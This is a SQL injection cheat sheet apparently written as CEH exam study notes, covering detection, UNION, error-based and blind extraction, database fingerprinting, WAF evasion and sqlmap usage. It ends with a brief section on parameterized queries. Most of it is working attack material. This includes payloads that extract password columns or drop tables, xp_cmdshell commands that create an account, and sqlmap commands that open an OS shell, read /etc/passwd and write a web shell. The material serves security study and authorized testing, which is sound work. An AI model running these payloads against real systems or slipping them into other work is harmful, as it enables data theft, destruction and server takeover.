# SQL Injection (CEH v13 - Module 15)

> For authorized security testing, red team exercises, and educational study only.

Exploiting improper input handling to execute arbitrary SQL against backend databases.

---

## SQLi Types

| Type | Subtype | Visibility |
|------|---------|------------|
| In-Band | Error-Based | Direct output in error messages |
| In-Band | UNION-Based | Direct output in query results |
| Blind | Boolean-Based | True/false inference from response |
| Blind | Time-Based | Inference from response delay |
| Out-of-Band | DNS Exfiltration | Data sent via DNS lookup |
| Out-of-Band | HTTP Exfiltration | Data sent via HTTP request |

---

## Detection

```sql
-- Single quote test (look for SQL error)
'

-- Tautology / authentication bypass
' OR 1=1--
' OR 'a'='a'--
" OR ""="
admin'--

-- Comment injection
'/*
'--
'#

-- Integer parameter test (no quotes needed)
1 OR 1=1
1 AND 1=2

-- String parameter test
' AND '1'='1
' AND '1'='2
```

**Indicators of vulnerability:** SQL error messages, behavioral difference between true/false conditions, unexpected response timing.

---

## UNION-Based Extraction

```sql
-- Step 1: Determine column count (ORDER BY)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    -- increment until error

-- Step 1 alt: NULL method
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--    -- increment until no error

-- Step 2: Identify displayable columns (string type)
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Step 3: Extract data
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

---

## Error-Based Extraction

```sql
-- MySQL
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--

-- MSSQL
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CAST((SELECT @@version) AS int)--

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=1/(SELECT 0 FROM pg_sleep(0) WHERE 1=CAST((SELECT version()) AS int))--

-- Oracle
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
```

---

## Blind Boolean-Based

```sql
-- Basic true/false test
' AND 1=1--    -- true (normal response)
' AND 1=2--    -- false (different response)

-- Substring extraction (character by character)
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--

-- Binary search optimization
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--   -- narrows range
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>112--
-- ... converge on exact ASCII value in ~7 requests per char

-- Length detection
' AND LENGTH((SELECT password FROM users LIMIT 1))>5--
' AND LENGTH((SELECT password FROM users LIMIT 1))=8--
```

---

## Blind Time-Based

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a') WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

---

## Database Fingerprinting

```sql
-- Version detection
MySQL:      SELECT version()          SELECT @@version
MSSQL:      SELECT @@version
PostgreSQL: SELECT version()
Oracle:     SELECT banner FROM v$version WHERE ROWNUM=1
SQLite:     SELECT sqlite_version()

-- String concatenation (fingerprint technique)
MySQL:      'foo' 'bar'      CONCAT('foo','bar')
MSSQL:      'foo'+'bar'
PostgreSQL: 'foo'||'bar'
Oracle:     'foo'||'bar'     CONCAT('foo','bar')
SQLite:     'foo'||'bar'

-- Comment styles
MySQL:      -- (space)  #  /* */  /*!version-specific*/
MSSQL:      -- (space)  /* */
PostgreSQL: -- (space)  /* */
Oracle:     -- (space)  /* */
```

---

## Information Schema Enumeration

```sql
-- MySQL / PostgreSQL / MSSQL (information_schema)
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema='target_db'
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- MSSQL (sysobjects)
SELECT name FROM sysobjects WHERE xtype='U'
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')

-- Oracle
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
SELECT owner,table_name FROM all_tables WHERE owner='SCHEMA_NAME'

-- SQLite
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE name='users'
```

---

## Database-Specific Syntax Comparison

| Operation | MySQL | MSSQL | PostgreSQL | Oracle | SQLite |
|-----------|-------|-------|------------|--------|--------|
| Version | `version()` | `@@version` | `version()` | `v$version` | `sqlite_version()` |
| Current DB | `database()` | `db_name()` | `current_database()` | `SYS_CONTEXT('USERENV','DB_NAME')` | N/A |
| Current User | `user()` | `user_name()` | `current_user` | `SYS_CONTEXT('USERENV','SESSION_USER')` | N/A |
| String concat | `CONCAT()` | `+` | `\|\|` | `\|\|` | `\|\|` |
| Substring | `SUBSTRING()` | `SUBSTRING()` | `SUBSTRING()` | `SUBSTR()` | `SUBSTR()` |
| Limit rows | `LIMIT N` | `TOP N` | `LIMIT N` | `ROWNUM<=N` | `LIMIT N` |
| If/then | `IF()` | `IIF()` | `CASE WHEN` | `CASE WHEN` | `CASE WHEN` |
| Time delay | `SLEEP(N)` | `WAITFOR DELAY` | `pg_sleep(N)` | `DBMS_PIPE.RECEIVE_MESSAGE` | N/A |
| Stacked queries | Yes | Yes | Yes | No (PL/SQL only) | Yes |
| Comment (line) | `-- ` or `#` | `-- ` | `-- ` | `-- ` | `-- ` |

---

## Advanced Techniques

```sql
-- Stacked queries (MSSQL, MySQL, PostgreSQL)
'; DROP TABLE users--
'; INSERT INTO users VALUES('evil','hacked')--
'; EXEC xp_cmdshell('whoami')--

-- Second-order injection
-- Step 1: Register username as: admin'--
-- Step 2: App stores it unsanitized
-- Step 3: Another query uses stored value without escaping
-- Example: password change query becomes:
--   UPDATE users SET password='new' WHERE user='admin'--'

-- Stored procedure injection (MSSQL)
'; EXEC sp_makewebtask 'C:\output.html','SELECT * FROM users'--
'; EXEC xp_cmdshell 'net user hacker P@ss /add'--
```

---

## WAF Evasion

```sql
-- Case variation
SeLeCt, uNiOn, FrOm

-- URL encoding
%27 (')   %23 (#)   %2D%2D (--)   %20 (space)
-- Double URL encoding
%2527     %2523

-- Inline comments (MySQL)
UN/**/ION SE/**/LECT
/*!50000UNION*/ /*!50000SELECT*/

-- Whitespace alternatives
UNION%09SELECT          -- tab
UNION%0ASELECT          -- newline
UNION%0DSELECT          -- carriage return
UNION%0D%0ASELECT       -- CRLF
UNION(SELECT)           -- parentheses (no space)

-- HTTP Parameter Pollution
?id=1 UNION/*&id=*/SELECT/*&id=*/password/*&id=*/FROM/*&id=*/users

-- Null bytes
%00' UNION SELECT--

-- Alternate encodings
CHAR(83,69,76,69,67,84)              -- MySQL CHAR()
0x53454c454354                        -- hex encoding
CAST('SELECT' AS VARCHAR)             -- CAST
```

---

## sqlmap

```bash
# Basic scan
sqlmap -u "http://target/page?id=1"

# Enumerate databases, tables, data
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D dbname --tables
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump
sqlmap -u "http://target/page?id=1" -D dbname -T users -C username,password --dump

# POST request
sqlmap -u "http://target/login" --data="user=admin&pass=test" -p user

# Cookie / header injection
sqlmap -u "http://target/page" --cookie="session=abc123" -p session
sqlmap -u "http://target/page" --headers="X-Forwarded-For: 1*"

# Increase depth and risk
sqlmap -u "http://target/page?id=1" --level=5 --risk=3

# Tamper scripts (WAF evasion)
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between,randomcase

# OS shell / file operations
sqlmap -u "http://target/page?id=1" --os-shell
sqlmap -u "http://target/page?id=1" --os-cmd="whoami"
sqlmap -u "http://target/page?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target/page?id=1" --file-write="shell.php" --file-dest="/var/www/shell.php"

# Batch mode (no prompts)
sqlmap -u "http://target/page?id=1" --batch

# Useful flags
--technique=BEUSTQ    # B=boolean, E=error, U=union, S=stacked, T=time, Q=inline
--dbms=mysql          # force DBMS
--proxy=http://127.0.0.1:8080
--random-agent        # random User-Agent
--tor                 # route through Tor
--flush-session       # clear cached session
```

---

## Prevention

```python
# Parameterized queries (Python)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Prepared statements (Java)
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, userId);

# Parameterized queries (PHP PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $id]);

# ORM (Django)
User.objects.filter(id=user_id)     # safe
User.objects.raw("SELECT ... " + id) # UNSAFE - never concatenate

# Stored procedures (use parameterized calls)
EXEC sp_GetUser @UserId = @InputId   -- safe
EXEC('SELECT * FROM users WHERE id=' + @InputId)  -- UNSAFE
```

**Defense checklist:**
- Use parameterized queries / prepared statements everywhere
- Apply least-privilege database accounts (no DBA for web apps)
- Deploy WAF rules (ModSecurity, AWS WAF, Cloudflare)
- Disable verbose error messages in production
- Validate and whitelist input types/ranges
- Use ORMs with caution (avoid raw query methods)
- Regular code review and SAST/DAST scanning

---

## Tips

- Always test with both `'` and `"` -- the delimiter matters
- Integer injection points do not need quotes: `1 AND 1=1`
- Use `--` with a trailing space (or `--+` URL-encoded) for MySQL comments
- Time-based blind is the universal fallback when no output is visible
- `ORDER BY` column counting is more reliable than `UNION SELECT NULL` on some DBMS
- Use `LIMIT 1 OFFSET N` (MySQL/PG) or `TOP 1 ... WHERE name NOT IN (...)` (MSSQL) to iterate rows
- Second-order SQLi is often missed by scanners -- test registration and profile update flows
- sqlmap `--level=3` tests cookies and headers; `--level=5` tests all parameters
- For CEH: know the difference between in-band, blind, and out-of-band by definition

---

## See Also

- `sheets/offensive/web-app-hacking.md` -- Web Application Attack Methodology
- `sheets/security/firewall-design.md` -- WAF Configuration

---

## References

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- OWASP Testing Guide - SQLi: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
- sqlmap Documentation: https://sqlmap.org/
- PortSwigger SQL Injection: https://portswigger.net/web-security/sql-injection
- CEH v13 Module 15: SQL Injection
